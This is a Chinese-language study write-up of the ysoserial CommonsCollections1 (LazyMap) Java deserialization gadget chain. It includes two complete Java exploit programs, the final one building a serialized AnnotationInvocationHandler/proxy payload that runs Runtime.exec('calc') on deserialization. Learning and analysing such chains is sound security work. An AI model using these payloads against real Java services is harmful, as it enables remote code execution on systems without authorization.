# Java 反序列化之 CC1
<!--toc-->
这一篇还是记录一下 ysoserial 的正版 CC1，在看这篇文章之前需要先学习动态代理相关知识。
<!--more-->

## 前言

- 书说上回，我们分析了一下 CC1 链当中的 TransformMap 的反序列化攻击，今天来补充一下正版 CC1 链的攻击分析。以下是 ysoserial 的调用链图


![](https://i.imgur.com/qAoLb3k.png)


## 正版 CC1 链分析

### 1.寻找链尾的 exec 方法

- 漏洞点还是 `InvokerTransformer`

在 `InvokerTransformer` 下的 `transform` 方法，进行 find usages 操作。

> 上一篇说的是 TransformedMap 的链子，今天则是正版 CC1 链里面的 LazyMap 链子

然后发现 LazyMap 的 get（公有的） 方法调用了 `.transform` 方法

![](https://i.imgur.com/QjCJr1Q.png)


### 2.寻找链子

- 从上图也可以看到是 `factory` 调用了 transform 方法，所以现在就要去找 `factory` 是什么

![](https://i.imgur.com/3vlzCkG.png)


factory 是 LazyMap 的一个受保护的成员变量，同时 LazyMap 的 `decorate` 静态方法可以实例化一个 LazyMap 类对象，并且可以控制 factory 变量的值。

 由于 LazyMap 的构造函数作用域为 `private`，所以无法直接获取，而 `decorate` 方法里面能够 new 一个 `LazyMap` 对象，于是我们构造如下的 EXP，来证明这条链子是可行的。

```java
package org.example;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;


public class Main {

        public static void main(String[] args) throws Exception{
                Runtime runtime = Runtime.getRuntime();
                InvokerTransformer invokerTrnasformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
                HashMap<Object,Object> hashMap = new HashMap<>();
                Map decorateMap = LazyMap.decorate(hashMap,invokerTrnasformer);
                // 以下通过反射调用 LazyMap 的 get 方法，也可以直接调用 get 方法，因为这个方法是 public 的
                Class<LazyMap> lazyMapClass = LazyMap.class;
                Method lazyGetMethod = lazyMapClass.getDeclaredMethod("get",Object.class);
                lazyGetMethod.setAccessible(true);
                lazyGetMethod.invoke(decorateMap,runtime);

        }
        
        }
        
```

- 运行之后成功弹出计算器，证明目前这条链是可行的，我们继续往上走，目标是找到入口类的 `readObject` 方法

所以我们看看谁调用了 `LazyMap.get()` 

最终在 `AnnotationInvocationHandler.invoke()` 方法中找到了有一个地方调用了 `get()` 方法。 

> 过于夸张，一共有2871个结果，不知道漏洞的发现者到底是如何找到这条链的。。。如果沒有找到 AnnotationInvocationHandler 的话，可以按住 ctrl+shift+r 开启全局搜索 AnnotationInvocationHandler

![](https://i.imgur.com/47NnYHA.png)




同时这个类也非常好，它里面有 `readObject()` 方法，可以作为我们的入口类。

- 现在的关键点是在于如何触发 `AnnotationInvocationHandler.invoke()`

### 3.编写 EXP

需要触发 `invoke()` 方法，马上想到动态代理，一个类被动态代理了之后，想要通过代理调用这个类的方法，就一定会调用 `invoke()` 方法。我们去找一找能利用的地方

![](https://i.imgur.com/eOaUhEz.png)




在该类的 readObject 反序列化里面调用了 `entrySet()` 方法，也就是说，如果我们将 `memberValues` 的值改为被代理对象，当调用被代理对象的方法，那么就会跳到执行 `invoke()` 方法，最终完成整条链子的调用。

直接上我们的 EXP

```java
package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

// 正版 CC1 链最终 EXP
public class Main {

        public static void main(String[] args) throws Exception{

                Transformer[] transformers = new Transformer[]{
                        new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数
                        new InvokerTransformer("getMethod",
                                new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                        new InvokerTransformer("invoke"
                                , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
                };

                ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
                HashMap<Object, Object> hashMap = new HashMap<>();
                Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);

                // 通过反射实例化一个 AnnocationInvocationHandler 类对象
                Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
                Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
                declaredConstructor.setAccessible(true);
                InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, decorateMap);

                //生成动态代理类对象
                Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()
                        , new Class[]{Map.class}, invocationHandler);

                // 实例化一个 AnnotationInvocationHandler 类对象并进行序列化，之后反序列化时就会调用到 AnnotationInvocationHandler 类的 readObject 方法
                InvocationHandler invocationHandler1 = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);

                serialize(invocationHandler1);
                unserialize("ser.bin");


        }
        public static void serialize(Object obj) throws IOException {
                ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
                oos.writeObject(obj);
        }
        public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
                ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
                Object obj = ois.readObject();
                return obj;
        }

}

```



EXP 最后又新建了一个 InvocationHandler1 实例并将这个实例反序列化，这一步目前真的不明白
    
>再一次学习动态代理后我大概理解了 exp 的操作，反序列化后会调用 invocationHandler1 的 readObject() 方法，而 invocationHandler1 的 memberValues 传入的是一个代理类对象 proxyMap，所以在AnnotationInvocationHandler 类的 444 行调用 memberValues.entrySet() 方法时调用的是 proxyMap.entrySet() ，根据动态代理相关知识，这里会自动调用和这个 proxyMap 相关联的调用处理器的 invoke() 方法。
和 proxyMap 相关联的调用处理器是 invocationHandler，所以会调用 invocationHandler 的 invoke() 方法，而 invocationHandler 又是 AnnotationInvocationHandler 类对象，所以会调用该类的 invoke() 方法，最终在这个方法里面调用了 memberValues.get(member);
而此时的 memberValues 是 decorateMap，这样就接上了我们的链子。




1. 最后会调用到 LazyMap 的 get 方法，传入的参数值是 `entrySet`
2. 之后调用 factory.transfrom(key)，factory为 chainedTransformer，key 为 entryset
3. 上一步的 key 是 entryset ，经过 chainedTransformer 的 transform 方法转换之后 key 首先变成了 Runtime.class，之后就是变成 InvokerTransformer 命令执行所需的一系列对象，最终导致命令执行

![](https://i.imgur.com/qZC9EmE.png)




i = 0

![](https://i.imgur.com/kqblsw9.png)




i = 1

![](https://i.imgur.com/ulf204n.png)



i = 2

![](https://i.imgur.com/Iza2EO2.png)



i = 3

![](https://i.imgur.com/UHugoI4.png)


## 参考链接

[芜风师傅](https://drun1baby.github.io/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/)

[ysoserial-CommonsCollections](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java)

